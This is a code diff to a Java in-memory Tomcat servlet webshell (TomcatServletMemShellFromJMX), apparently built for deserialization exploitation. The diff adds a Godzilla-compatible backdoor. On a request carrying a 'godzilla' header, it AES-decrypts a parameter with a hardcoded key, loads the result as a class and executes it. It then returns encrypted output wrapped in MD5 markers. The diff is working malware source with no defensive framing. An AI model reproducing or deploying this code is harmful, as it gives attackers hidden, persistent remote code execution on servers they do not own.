@@ -28,6 +28,8 @@ import javax.servlet.http.HttpSession;
 import java.io.IOException;
 import java.lang.reflect.Field;
 import java.lang.reflect.Method;
+import java.net.URL;
+import java.net.URLClassLoader;
 import java.util.*;
 
 public class TomcatServletMemShellFromJMX extends AbstractTranslet implements Servlet {
@@ -77,6 +79,58 @@ public class TomcatServletMemShellFromJMX extends AbstractTranslet implements Se
         }
     }
 
+    String xc = "3c6e0b8a9c15224a"; // key
+    String pass = "pass";
+    String md5 = md5(pass + xc);
+    Class payload;
+
+    public static String md5(String s) {
+        String ret = null;
+        try {
+            java.security.MessageDigest m;
+            m = java.security.MessageDigest.getInstance("MD5");
+            m.update(s.getBytes(), 0, s.length());
+            ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();
+        } catch (Exception e) {
+        }
+        return ret;
+    }
+
+    public static String base64Encode(byte[] bs) throws Exception {
+        Class base64;
+        String value = null;
+        try {
+            base64 = Class.forName("java.util.Base64");
+            Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);
+            value = (String) Encoder.getClass().getMethod("encodeToString", new Class[]{byte[].class}).invoke(Encoder, new Object[]{bs});
+        } catch (Exception e) {
+            try {
+                base64 = Class.forName("sun.misc.BASE64Encoder");
+                Object Encoder = base64.newInstance();
+                value = (String) Encoder.getClass().getMethod("encode", new Class[]{byte[].class}).invoke(Encoder, new Object[]{bs});
+            } catch (Exception e2) {
+            }
+        }
+        return value;
+    }
+
+    public static byte[] base64Decode(String bs) throws Exception {
+        Class base64;
+        byte[] value = null;
+        try {
+            base64 = Class.forName("java.util.Base64");
+            Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);
+            value = (byte[]) decoder.getClass().getMethod("decode", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
+        } catch (Exception e) {
+            try {
+                base64 = Class.forName("sun.misc.BASE64Decoder");
+                Object decoder = base64.newInstance();
+                value = (byte[]) decoder.getClass().getMethod("decodeBuffer", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
+            } catch (Exception e2) {
+            }
+        }
+        return value;
+    }
 
     @Override
     public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
@@ -192,12 +246,40 @@ public class TomcatServletMemShellFromJMX extends AbstractTranslet implements Se
                         Class evilclass = (Class) method.invoke(Thread.currentThread().getContextClassLoader(), evilclass_byte, 0, evilclass_byte.length);
                         evilclass.newInstance().equals(pageContext);
                     }
-                } else {
-                    ((ResponseFacade) lastResponse).getWriter().println("error");
+                } else if (request.getHeader("x-client-data").equalsIgnoreCase("godzilla")) {
+                    // 哥斯拉是通过 localhost/?pass=payload 传参 不存在包装类问题
+                    byte[] data = base64Decode(request.getParameter(pass));
+                    data = x(data, false);
+                    if (payload == null) {
+                        URLClassLoader urlClassLoader = new URLClassLoader(new URL[0], Thread.currentThread().getContextClassLoader());
+                        Method defMethod = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
+                        defMethod.setAccessible(true);
+                        payload = (Class) defMethod.invoke(urlClassLoader, data, 0, data.length);
+                    } else {
+                        java.io.ByteArrayOutputStream arrOut = new java.io.ByteArrayOutputStream();
+                        Object f = payload.newInstance();
+                        f.equals(arrOut);
+                        f.equals(data);
+                        f.equals(request);
+                        response.getWriter().write(md5.substring(0, 16));
+                        f.toString();
+                        response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));
+                        response.getWriter().write(md5.substring(16));
+                    }
                 }
             }
         } catch (Exception e) {
 //            e.printStackTrace();
+        }
+    }
+
+    public byte[] x(byte[] s, boolean m) {
+        try {
+            javax.crypto.Cipher c = javax.crypto.Cipher.getInstance("AES");
+            c.init(m ? 1 : 2, new javax.crypto.spec.SecretKeySpec(xc.getBytes(), "AES"));
+            return c.doFinal(s);
+        } catch (Exception e) {
+            return null;
         }
     }
 
